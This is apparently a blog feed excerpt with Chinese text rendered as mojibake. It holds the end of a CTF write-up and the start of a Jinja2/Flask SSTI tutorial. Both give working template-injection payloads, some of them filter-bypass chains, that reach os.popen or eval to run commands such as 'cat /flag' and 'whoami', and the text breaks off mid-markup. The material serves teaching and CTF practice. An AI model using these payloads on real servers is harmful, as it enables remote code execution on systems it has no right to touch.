å‡ºæ¥è´¦å·ï¼šadmin&#x2F;asdqwe</p><p>ç„¶åè¿›å…¥å¤è¯»æœºæ¨¡å¼ï¼š</p><p>ä¸€çœ¼SSTIï¼Œæ³¨æ„åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;ã€&#123;%%&#125;ã€_ã€&#x27;</span><br></pre></td></tr></table></figure><p>éƒ½è¢«banäº†ï¼Œè¿™æˆ‘è¿˜æ³¨ä¸ªé›†è´¸å•ŠğŸ˜¡ï¼Œç„¶åè¯•è¯•å…¶ä»–çš„ï¼Œå‘ç°å½“ä½ è¾“å…¥ç‰¹æ®Šå­—ç¬¦çš„æ—¶å€™ä¼šè¢«æ‰§è¡Œä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±ä½¿ç”¨requestå’Œ|attrç»„åˆæŠ€æ‰“ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=ğŸ˜¡(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.g)(request.values.h)).read()ğŸ˜¡&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;g=popen&amp;h=cat /flag</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=ğŸ˜¡lipsum|attr(request.args.glo)|attr(request.args.ge)(request.args.o)|attr(request.args.po)(request.args.cmd)|attr(request.args.re)()ğŸ˜¡&amp;glo=__globals__&amp;ge=__getitem__&amp;o=os&amp;po=popen&amp;cmd=cat /flag&amp;re=read</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sentence=æˆ‘æ˜¯()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(132)|attr(request.values.e)|attr(request.values.f)|attr(request.values.d)(request.values.l)|attr(request.values.d)(request.values.k)(request.values.h)&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=__getitem__&amp;e=__init__&amp;f=__globals__&amp;l=__builtins__&amp;k=eval&amp;h=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSTIæ¼æ´</title>
      <link href="/2025/04/02/SSTI%E6%BC%8F%E6%B4%9E/"/>
      <url>/2025/04/02/SSTI%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="SSTIæ¼æ´"><a href="#SSTIæ¼æ´" class="headerlink" title="SSTIæ¼æ´"></a>SSTIæ¼æ´</h2><h4 id="æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"><a href="#æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥" class="headerlink" title="æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥"></a>æœåŠ¡ç«¯æ¨¡æ¿æ³¨å…¥</h4><p>SSTI(Server-Side Template Injection)ä»åå­—å¯ä»¥çœ‹å‡ºå³æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ã€‚æ¯”å¦‚pythonä¸­çš„flaskã€phpçš„thinkphpã€javaçš„springç­‰æ¡†æ¶ä¸€èˆ¬éƒ½é‡‡ç”¨MVCçš„æ¨¡å¼ï¼Œç”¨æˆ·çš„è¾“å…¥å…ˆè¿›å…¥Controlleræ§åˆ¶å™¨ï¼Œç„¶åæ ¹æ®è¯·æ±‚ç±»å‹å’Œè¯·æ±‚çš„æŒ‡ä»¤å‘é€ç»™å¯¹åº”Modelä¸šåŠ¡æ¨¡å‹è¿›è¡Œä¸šåŠ¡é€»è¾‘åˆ¤æ–­ï¼Œæ•°æ®åº“å­˜å–ï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™Viewè§†å›¾å±‚ï¼Œç»è¿‡æ¨¡æ¿æ¸²æŸ“å±•ç¤ºç»™ç”¨æˆ·ã€‚(è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯è®°å½•pythonçš„)</p><h4 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h4><p>é¦–å…ˆè¦çŸ¥é“ä»€ä¹ˆæ˜¯æ¨¡æ¿ï¼Œæ¨¡æ¿å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€æ®µå›ºå®šå¥½æ ¼å¼ï¼Œç­‰ç€å¼€å‘äººå‘˜æˆ–è€…ç”¨æˆ·æ¥å¡«å……ä¿¡æ¯çš„æ–‡ä»¶ã€‚é€šè¿‡è¿™ç§æ–¹æ³•ï¼Œå¯ä»¥åšåˆ°é€»è¾‘ä¸è§†å›¾åˆ†ç¦»ï¼Œæ›´å®¹æ˜“ã€æ¸…æ¥šä¸”ç›¸å¯¹å®‰å…¨åœ°ç¼–å†™å‰åç«¯ä¸åŒçš„é€»è¾‘ã€‚</p><h5 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI:"></a>SSTI:</h5><p>æœåŠ¡ç«¯æ¥æ”¶æ”»å‡»è€…çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†æ”»å‡»è€…æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç›®çš„ã€‚è¿™ä¹ˆè¯´å¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸‹é¢çš„pythonä¸­çš„åŸºäºjinja2çš„æ¨¡æ¿æ¸²æŸ“ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`from flask import *`</span><br><span class="line">`from jinja2 import *`</span><br><span class="line"></span><br><span class="line">`app = Flask(__name__)`</span><br><span class="line"></span><br><span class="line">`@app.route(&quot;/myan&quot;)`</span><br><span class="line"></span><br><span class="line">`def index():`</span><br><span class="line">    `name = request.args.get(&#x27;name&#x27;,&#x27;guest&#x27;)`</span><br><span class="line">    `html = &#x27;&#x27;&#x27;&lt;h3&gt; Hello %s&#x27;&#x27;&#x27;%name`</span><br><span class="line">    `return render_template_string(html)`</span><br><span class="line"></span><br><span class="line">`if __name__ == &quot;__main__&quot;:`</span><br><span class="line">        `app.run(debug=True)`</span><br></pre></td></tr></table></figure><p>è¿è¡Œåè®¿é—®<code>http://127.0.0.1:5000/myan</code> å¯ä»¥å‘ç°é»˜è®¤çš„æ¨¡æ¿è§£æå‚æ•°ä¸ºguestï¼Œä»ä¸Šé¢çš„pythonä»£ç ä¸­æˆ‘ä»¬å‘ç°æœåŠ¡ç«¯çš„é€»è¾‘æ˜¯æ¥æ”¶å‰ç«¯è¾“å…¥çš„nameå‚æ•°ï¼Œç„¶åå°†å…¶è¿”å›åˆ°åç«¯è¿›è¡Œæ‹¼æ¥å†è¿”å›å‰ç«¯è¿›è¡Œå±•ç¤ºï¼Œå½“æˆ‘ä»¬è¾“å…¥?name&#x3D;myanæ—¶å¯ä»¥å‘ç°å‰ç«¯è¿”å›ç»“æœ å›æ˜¾ï¼šHello myan</p><h5 id="æ¨¡æ¿æ¸²æŸ“å‡½æ•°"><a href="#æ¨¡æ¿æ¸²æŸ“å‡½æ•°" class="headerlink" title="æ¨¡æ¿æ¸²æŸ“å‡½æ•°"></a>æ¨¡æ¿æ¸²æŸ“å‡½æ•°</h5><p>è¿™é‡Œä¸»è¦æœ‰ä¸¤ç§æ¨¡æ¿æ¸²æŸ“å‡½æ•°ï¼Œrender_template_string()ä¸render_template()ï¼Œå…¶ä¸­render_templateæ˜¯ç”¨æ¥æ¸²æŸ“ä¸€ä¸ªæŒ‡å®šæ–‡ä»¶çš„ã€‚render_template_string()åˆ™æ˜¯ç”¨æ¥æ¸²æŸ“å­—ç¬¦ä¸²çš„ã€‚è€Œæ¸²æŸ“å‡½æ•°åœ¨æ¸²æŸ“çš„æ—¶å€™ï¼Œå¾€å¾€å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä¸åšæ¸²æŸ“ï¼Œå³ï¼š<code>&#123;&#123;&#125;&#125;</code>åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ<code>&#123;&#123;&#125;&#125;</code>åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚<code>&#123;&#123;2*2&#125;&#125;</code>ä¼šè¢«è§£ææˆ4ã€‚å› æ­¤æ‰æœ‰äº†ç°åœ¨çš„æ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚å¾€å¾€å˜é‡æˆ‘ä»¬ä½¿ç”¨<code>&#123;&#123;æ¶æ„ä»£ç &#125;&#125;</code>ã€‚æ­£å› ä¸º<code>&#123;&#123;&#125;&#125;</code>åŒ…è£¹çš„ä¸œè¥¿ä¼šè¢«è§£æï¼Œå› æ­¤æˆ‘ä»¬å°±å¯ä»¥å®ç°ç±»ä¼¼äºSQLæ³¨å…¥çš„æ¼æ´ã€‚</p><h4 id="SSTIæ”»å‡»æ–¹æ³•ï¼š"><a href="#SSTIæ”»å‡»æ–¹æ³•ï¼š" class="headerlink" title="SSTIæ”»å‡»æ–¹æ³•ï¼š"></a>SSTIæ”»å‡»æ–¹æ³•ï¼š</h4><h5 id="ç»§æ‰¿å…³ç³»ï¼š"><a href="#ç»§æ‰¿å…³ç³»ï¼š" class="headerlink" title="ç»§æ‰¿å…³ç³»ï¼š"></a>ç»§æ‰¿å…³ç³»ï¼š</h5><p>è¿™é‡Œæˆ‘æƒ³å…ˆè®²è®²ç±»ä¹‹é—´çš„ç»§æ‰¿å…³ç³»ï¼Œå› ä¸ºåœ¨åé¢çš„æ”»å‡»ä¸­ç”¨åˆ°çš„å°±æ˜¯è¿™ç§ç»§æ‰¿å…³ç³»çš„ä¸æ–­è°ƒç”¨æœ€ç»ˆè¾¾åˆ°ä¸€ä¸ªrceçš„æ•ˆæœï¼Œè¿™é‡Œæˆ‘ä»¬å°±å…·ä½“è®²è®²ç±»çš„ç»§æ‰¿å…³ç³»ã€‚</p><p><code>class A:pass</code></p><p><code>class B:pass</code></p><p><code>class C:pass</code></p><p><code>class D:pass</code></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åˆ›å»ºäº†4ä¸ªç±»ï¼Œå…¶ä¸­çš„Bç±»ç»§æ‰¿äº†Aç±»ï¼ŒCã€Dç±»ç»§æ‰¿äº†Bç±»,å¦‚æœæˆ‘ä»¬åœ¨è¿™åˆ›å»ºä¸€ä¸ªCçš„å¯¹è±¡cï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡__class__é­”æœ¯æ–¹æ³•æ¥æ‰¾åˆ°å®ƒçš„å½“å‰ç±»</p><p><code>c=C()</code></p><p><code>print(c.__class__.__base__)</code></p><p>å¯ä»¥çœ‹åˆ°å›æ˜¾Cç±»çš„çˆ¶ç±»Bç±»ï¼Œå¦‚æœæƒ³æ‰¾åˆ°Aç±»é‚£å°±å†åŠ ä¸€ä¸ª<code>.__base__</code></p><p>å†ä¹‹åAç±»ä¸Šé¢åº”è¯¥æ˜¯æ²¡æœ‰ç±»äº†ä½†æ˜¯å…¶å®åœ¨pythoné‡Œé¢æ‰€æœ‰çš„ç±»éƒ½æ˜¯objectï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç±»è€Œæ²¡æœ‰æ˜¾å¼åœ°æŒ‡å®šå®ƒç»§æ‰¿çš„çˆ¶ç±»æ—¶ï¼Œè¿™ä¸ªç±»å°±ä¼šé»˜è®¤ç»§æ‰¿objectç±»ï¼Œå› æ­¤æˆ‘ä»¬åœ¨åˆ°Aç±»é‡Œé¢å†æ·»åŠ ä¸€ä¸ª__base__å°±èƒ½æ‹¿åˆ°objectï¼Œå½“ç„¶è¿™æ ·ä¸€ä¸ªä¸€ä¸ªé€’è¿›ä¸Šå»çš„æ–¹æ³•æœ‰ä¸€äº›éº»çƒ¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨__mro__é­”æœ¯æ–¹æ³•æ¥ä¸€æ­¥åˆ°ä½çœ‹åˆ°ç±»çš„æ‰€æœ‰çˆ¶ç±»(ç”±äºå®ƒæ˜¯ä»¥æ•°ç»„å½¢å¼çš„æ‰€ä»¥æˆ‘ä»¬åœ¨åé¢åŠ ä¸Šä¸‹æ ‡å°±èƒ½æ‹¿åˆ°æŒ‡å®šçš„ç±»äº†)</p><p><code>print(c.__class__.__mro__[3])</code></p><p>æˆ‘ä»¬åœ¨æ‹¿åˆ°objectç±»åå°±å¯ä»¥é€šè¿‡objectç±»æ¥æŸ¥æ‰¾pythonä¸­çš„æ‰€æœ‰objectç±»çš„å­ç±»ï¼Œå½“ç„¶è¿™å…¶ä¸­ä¼šæœ‰æˆ‘ä»¬èƒ½é€šè¿‡è¯¥ç±»rceçš„å­ç±»ã€‚æˆ‘ä»¬é€šè¿‡__subclasses__æ¥è·å–å½“å‰ç±»çš„æ‰€æœ‰å­ç±»ï¼Œ<code>print(c.__class__.__mro__[3].__subclasser__)</code></p><p>å¯ä»¥å‘ç°æœ‰å¾ˆå¤šç±»ï¼Œå‰é¢æˆ‘ä»¬ä¹Ÿè¯´åˆ°äº†pythonçš„æ‰€æœ‰ç±»æœ€ç»ˆéƒ½æ˜¯ç»§æ‰¿objectç±»çš„ï¼Œå› æ­¤è¿™é‡Œå­˜åœ¨å¤§é‡çš„ç±»ï¼Œå½“ç„¶æˆ‘ä»¬æœ€ç»ˆçš„ç›®çš„æ˜¯è¦å»è¿›è¡Œrceï¼Œå› æ­¤æˆ‘ä»¬åº”è¯¥å¯»æ‰¾ä¸ä¹‹ç›¸å…³çš„ç±»ï¼Œè¿™é‡Œå°±ç»™å‡ºä¸€ä¸ªç±»<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œæ‰¾ä¸€ä¸‹ï¼Œä¸€èˆ¬å¤§æ¦‚åœ¨ç¬¬139ä¸ªï¼Œä¸è¿‡å…·ä½“çš„ç¯å¢ƒè¿˜æ˜¯è¦å…·ä½“åˆ†æï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œå°±æ˜¯156(æœ‰æ—¶å€™å¯ä»¥ä½¿ç”¨ä¸€äº›è„šæœ¬è¯•è¯•)ï¼Œè·Ÿå‰é¢çš„__mro__é­”æœ¯æ–¹æ³•ä¸€æ ·æ˜¯ç”¨æ•°ç»„è¡¨ç¤ºçš„ï¼Œå¯ä»¥ç”¨ä¸‹æ ‡æ‰¾åˆ°å¯¹åº”çš„ç±»ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç»™è¿™ä¸ªç±»è¿›è¡Œä¸€äº›åˆå§‹åŒ–æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(c.__class__.__mro__[3].__subclasses__()[156].__init__.__globals__)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°å¾ˆå¤šå…¨å±€å˜é‡éƒ½åœ¨é‡Œé¢ï¼Œæˆ‘ä»¬éœ€è¦æœ€åèƒ½å¤Ÿè¿›è¡Œrceï¼Œå› æ­¤åº”è¯¥æ‰¾åˆ°èƒ½æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„æ–¹æ³•ï¼Œè¿™é‡Œç”¨popenå‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œåœ¨åé¢åŠ ä¸Šå…·ä½“çš„å‡½æ•°åå³å¯æ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œæˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹shellå‘½ä»¤ï¼Œè¿™é‡Œæ‰§è¡Œä¸€ä¸‹whoamiï¼Œè¿™é‡Œä¸€å®šè¦è®°å¾—ç”¨.read()æ¥è¯»å–ä¸€ä¸‹ï¼Œå› ä¸ºpopenæ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªä¸å­è¿›ç¨‹é€šä¿¡çš„å¯¹è±¡ï¼Œä¸ºäº†ä»è¯¥å¯¹è±¡ä¸­è·å–å­è¿›ç¨‹çš„è¾“å‡ºï¼Œå› æ­¤éœ€è¦ä½¿ç”¨read()æ–¹æ³•æ¥è¯»å–å­è¿›ç¨‹çš„è¾“å‡º</p><p><code>print(c.__class__.__mro__[3].__subclasses__()[156].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read())</code></p><p>å¯ä»¥å‘ç°æˆåŠŸæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å…¶å®é€šè¿‡ç±»çš„ç»§æ‰¿å…³ç³»é‡Œå¤§è‡´è®²å®Œäº†SSTIçš„ä¸€ä¸ªæ”»å‡»çš„æ€è·¯ã€‚</p><h5 id="é­”æœ¯æ–¹æ³•ï¼š"><a href="#é­”æœ¯æ–¹æ³•ï¼š" class="headerlink" title="é­”æœ¯æ–¹æ³•ï¼š"></a>é­”æœ¯æ–¹æ³•ï¼š</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`__class__            è¿”å›è¯¥å¯¹è±¡æ‰€å±çš„ç±»ã€‚pyä¸‡ç‰©çš†å¯¹è±¡ï¼Œæ¯”å¦‚æŸä¸ªå­—ç¬¦ä¸²å¯¹è±¡ï¼Œè€Œå…¶æ‰€å±çš„ç±»ä¸º&lt;class &#x27;str&#x27;&gt;`</span><br><span class="line">`__base__             ä»¥å­—ç¬¦ä¸²å½¢å¼è¿”å›ä¸€ä¸ªç±»çš„çˆ¶ç±»`</span><br><span class="line">`__bases__            ä»¥å…ƒç»„å½¢å¼è¿”å›ä¸€ä¸ªç±»çš„å…¨éƒ¨çˆ¶ç±»`</span><br><span class="line">`__mro__              è¿”å›è§£ææ–¹æ³•è°ƒç”¨çš„é¡ºåºï¼Œå³è¿”å›æ‰€æœ‰çˆ¶ç±»`</span><br><span class="line">`__subclasses__()     è¿”å›è¿™ä¸ªç±»çš„æ‰€æœ‰å­ç±»`</span><br><span class="line">`__init__             åˆå§‹åŒ–ç±»ï¼Œè¿”å›çš„ç±»å‹æ˜¯function`</span><br><span class="line">`__globals__          ç”¨äºè·å–functionæ‰€å¤„ç©ºé—´ä¸‹å¯ä½¿ç”¨çš„moduleã€æ–¹æ³•ä»¥åŠæ‰€æœ‰å˜é‡`</span><br><span class="line">`__dic__              ç±»çš„é™æ€å‡½æ•°ã€ç±»å‡½æ•°ã€æ™®é€šå‡½æ•°ã€å…¨å±€å˜é‡ä»¥åŠä¸€äº›å†…ç½®çš„å±æ€§éƒ½æ˜¯æ”¾åœ¨ç±»çš„__dict__é‡Œ`</span><br><span class="line">`__str__()            è¿”å›æå†™è¿™ä¸ªå¯¹è±¡çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç†è§£æˆæ˜¯æ‰“å°å‡ºæ¥ã€‚`</span><br><span class="line">`__getattribute__()   ç»•è¿‡å…³é”®å­—ã€‚å®ä¾‹ã€ç±»ã€å‡½æ•°éƒ½å…·æœ‰çš„__getattribute__é­”æœ¯æ–¹æ³•ã€‚äº‹å®ä¸Šï¼Œåœ¨å®ä¾‹åŒ–çš„å¯¹è±¡è¿›è¡Œ.æ“ä½œçš„æ—¶å€™ï¼ˆå½¢å¦‚ï¼ša.xxx/a.xxx()ï¼‰ï¼Œéƒ½ä¼šè‡ªåŠ¨å»è°ƒç”¨__getattribute__æ–¹æ³•ã€‚å› æ­¤æˆ‘ä»¬åŒæ ·å¯ä»¥ç›´æ¥é€šè¿‡è¿™ä¸ªæ–¹æ³•æ¥è·å–åˆ°å®ä¾‹ã€ç±»ã€å‡½æ•°çš„å±æ€§ã€‚`</span><br><span class="line">`__getitem__()        ç»•è¿‡[]ã€‚è°ƒç”¨å­—å…¸ä¸­çš„é”®å€¼ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œæ¯”å¦‚a[&#x27;b&#x27;]ï¼Œå°±æ˜¯a.__getitem__(&#x27;b&#x27;)`</span><br><span class="line">`__import__           åŠ¨æ€åŠ è½½ç±»å’Œå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥æ¨¡å—ï¼Œç»å¸¸ç”¨äºå¯¼å…¥osæ¨¡å—ï¼Œ__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]`</span><br><span class="line"></span><br><span class="line">`__builtins__         å†…å»ºåç§°ç©ºé—´ï¼Œé‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°ã€‚__builtins__ä¸__builtin__çš„åŒºåˆ«å°±ä¸æ”¾äº†ï¼Œç™¾åº¦éƒ½æœ‰ã€‚`</span><br><span class="line">`url_for              flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#x27;__builtins__&#x27;]å«æœ‰current_appã€‚`</span><br><span class="line">`get_flashed_messages flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”url_for.__globals__[&#x27;__builtins__&#x27;]å«æœ‰current_appã€‚`</span><br><span class="line">`lipsum               flaskçš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸”lipsum.__globals__å«æœ‰osæ¨¡å—ï¼š&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;`</span><br><span class="line"></span><br><span class="line">`request              å¯ä»¥ç”¨äºè·å–å­—ç¬¦ä¸²æ¥ç»•è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢è¿™äº›ï¼Œå¼•ç”¨ä¸€ä¸‹ç¾½å¸ˆå‚…çš„ã€‚æ­¤å¤–ï¼ŒåŒæ ·å¯ä»¥è·å–openå‡½æ•°:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()`</span><br><span class="line">`request.args.x1    getä¼ å‚`</span><br><span class="line">`request.values.x1  æ‰€æœ‰å‚æ•°`</span><br><span class="line">`request.cookies      cookieså‚æ•°`</span><br><span class="line">`request.headers      è¯·æ±‚å¤´å‚æ•°`</span><br><span class="line">`request.form.x1    postä¼ å‚(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)`</span><br><span class="line">`request.data   postä¼ å‚(Content-Type:a/b)`</span><br><span class="line">`request.json postä¼ json  (Content-Type: application/json)`</span><br><span class="line"></span><br><span class="line">`config               å½“å‰applicationçš„æ‰€æœ‰é…ç½®ã€‚æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥è¿™æ ·&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;`</span><br><span class="line">`current_app          åº”ç”¨ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªå…¨å±€å˜é‡ã€‚`</span><br><span class="line">`g                    &#123;&#123;g&#125;&#125;å¾—åˆ°&lt;flask.g of &#x27;flask_ssti&#x27;&gt;`  </span><br></pre></td></tr></table></figure><p>â€‹    (çœŸçš„å¤š)</p><h5 id="å¸¸è§çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š"><a href="#å¸¸è§çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š" class="headerlink" title="å¸¸è§çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š"></a>å¸¸è§çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼š</h5><h6 id="os-system"><a href="#os-system" class="headerlink" title="os.system():"></a>os.system():</h6><p><code>â€¦init__globals[â€˜osâ€™].system(â€˜lsâ€™)</code>çš„è¾“å‡ºæ˜¯æ‰§è¡Œç»“æœçš„è¿”å›å€¼ï¼Œè€Œä¸æ˜¯æ‰§è¡Œå‘½ä»¤çš„è¾“å‡ºï¼ŒæˆåŠŸæ‰§è¡Œè¿”å›0ï¼Œå¤±è´¥è¿”å›-1ï¼Œå› ä¸ºè¾“å‡ºç»“æœä¸æ˜æ˜¾ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¼šç”¨åˆ°ä¸‹é¢è¿™ä¸ªå‘½ä»¤ï¼š</p><h6 id="os-popen"><a href="#os-popen" class="headerlink" title="os.popen():"></a>os.popen():</h6><p>ç”¨æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`os.popen(command[,mode[,bufsize]])`</span><br><span class="line">`eg:&#123;&#123;()class.base.subclass__()[71].init.globlas__[â€˜osâ€™].popen(â€˜lsâ€™,â€˜râ€™).read()&#125;&#125;`</span><br></pre></td></tr></table></figure><p>è¯´æ˜ï¼šmode â€“ æ¨¡å¼æƒé™å¯ä»¥æ˜¯ â€˜râ€™(é»˜è®¤) æˆ– â€˜wâ€™ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">init.globals__[â€˜osâ€™].popen(â€˜lsâ€™,â€˜râ€™),read()</span><br></pre></td></tr></table></figure><p>popenæ–¹æ³•é€šè¿‡p.read()è·å–ç»ˆç«¯è¾“å‡ºï¼Œè€Œä¸”popenéœ€è¦å…³é—­close().å½“æ‰§è¡ŒæˆåŠŸæ—¶ï¼Œclose()ä¸è¿”å›ä»»ä½•å€¼ï¼Œå¤±è´¥æ—¶ï¼Œclose()è¿”å›ç³»ç»Ÿè¿”å›å€¼ï¼ˆå¤±è´¥è¿”å›1ï¼‰. å¯è§å®ƒè·å–è¿”å›å€¼çš„æ–¹å¼å’Œos.systemä¸åŒã€‚</p><p>ç¼ºç‚¹ï¼šPopenéå¸¸å¼ºå¤§ï¼Œæ”¯æŒå¤šç§å‚æ•°å’Œæ¨¡å¼ï¼Œé€šè¿‡å…¶æ„é€ å‡½æ•°å¯ä»¥çœ‹åˆ°æ”¯æŒå¾ˆå¤šå‚æ•°ã€‚ä½†Popenå‡½æ•°å­˜åœ¨ç¼ºé™·åœ¨äºï¼Œå®ƒæ˜¯ä¸€ä¸ªé˜»å¡çš„æ–¹æ³•ï¼Œå¦‚æœè¿è¡Œcmdå‘½ä»¤æ—¶äº§ç”Ÿå†…å®¹éå¸¸å¤šï¼Œå‡½æ•°å°±å®¹æ˜“é˜»å¡ã€‚å¦ä¸€ç‚¹ï¼ŒPopenæ–¹æ³•ä¹Ÿä¸ä¼šæ‰“å°å‡ºcmdçš„æ‰§è¡Œä¿¡æ¯</p><h6 id="warnings-catchwarning"><a href="#warnings-catchwarning" class="headerlink" title="warnings.catchwarning:"></a>warnings.catchwarning:</h6><p>è®¿é—®osæ¨¡å—è¿˜æœ‰ä»warnings.catchwarningsæ¨¡å—å…¥æ‰‹çš„ï¼Œè€Œè¿™ä¸¤ä¸ªæ¨¡å—åˆ†åˆ«ä½äºå…ƒç»„ä¸­çš„59ï¼Œ60å·å…ƒç´ ã€‚__init__æ–¹æ³•ç”¨äºå°†å¯¹è±¡å®ä¾‹åŒ–ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡funcglobalsï¼ˆæˆ–è€…__globalsï¼‰çœ‹è¯¥æ¨¡å—ä¸‹æœ‰å“ªäº›globalså‡½æ•°ï¼ˆæ³¨æ„è¿”å›çš„æ˜¯å­—å…¸ï¼‰ï¼Œè€Œlinecacheå¯ç”¨äºè¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶çš„æŸä¸€è¡Œï¼Œè€Œè¿™ä¸ªå‡½æ•°å¼•ç”¨äº†osæ¨¡å—ã€‚</p><p>ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;ls&#x27;)`</span><br><span class="line"></span><br><span class="line">`[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__.values()[12].system(&#x27;ls&#x27;)`</span><br></pre></td></tr></table></figure><h6 id="builtins-å†…å»ºå‡½æ•°"><a href="#builtins-å†…å»ºå‡½æ•°" class="headerlink" 